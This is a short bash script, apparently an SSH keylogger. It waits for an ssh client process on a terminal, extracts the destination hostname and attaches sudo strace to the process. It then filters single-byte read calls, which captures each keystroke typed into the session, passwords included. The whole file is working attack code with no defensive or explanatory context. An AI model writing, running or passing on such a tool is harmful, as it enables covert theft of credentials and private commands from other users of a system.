#!/bin/bash

ssh_pid=$(ps aux | grep -v grep | grep -i "ssh" | grep -i "pts" | sed -e 's/  */ /g' | cut -d" " -f 2)

while [ ! $ssh_pid ];
do
   ssh_pid=$(ps aux | grep -v grep | grep -i "ssh" | grep -i "pts" | sed -e 's/  */ /g' | cut -d" " -f 2)
done

hostname=$(sudo ps -p $ssh_pid -o args --no-headers | cut -d " " -f 2)
echo -e "Connecting to: $hostname\n"
echo "Keylogging ..."
sudo strace -t -p $ssh_pid -e read,openat  2>&1 | grep --line-buffered -w -e 'openat' -e '= 1'